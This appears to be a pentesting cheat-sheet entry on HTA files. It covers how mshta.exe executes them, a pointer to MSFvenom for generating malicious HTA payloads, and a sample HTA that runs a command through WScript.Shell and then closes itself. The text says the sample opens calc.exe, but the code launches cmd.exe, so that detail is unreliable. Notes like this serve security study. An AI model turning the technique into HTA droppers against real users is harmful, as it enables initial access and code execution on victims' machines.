# HTA

#### ️HTA application

> Files with the extension `.hta` are automatically executed by the **Internet Explorer** (IE) browser as HTML application (via **`mshta.exe`**).

We can use `MSFvenom` to generate a HTA malicious application [Link](https://github.com/amirr0r/notes/blob/master/Infosec/boot2root-cheatsheet.md#msfvenom)

&#x20;If we visit a URL containing an HTML application, IE will trigger two popups. One that asks us if we want to open or save the file. Another security warning to inform the application will be opened outside the Protected mode.

Example [Windows Script Host Shell object](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/windows-scripting/aew9yb99\(v=vs.84\)) opening **calc.exe** via [ActiveXObjects](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Microsoft\_Extensions/ActiveXObject):

```html
<html>

<script>
var c = 'cmd.exe'
new ActiveXObject('WScript.Shell').Run(c);
</script>

<head></head>

<body>
<script>
self.close();
</script>
</body>

</html>
```
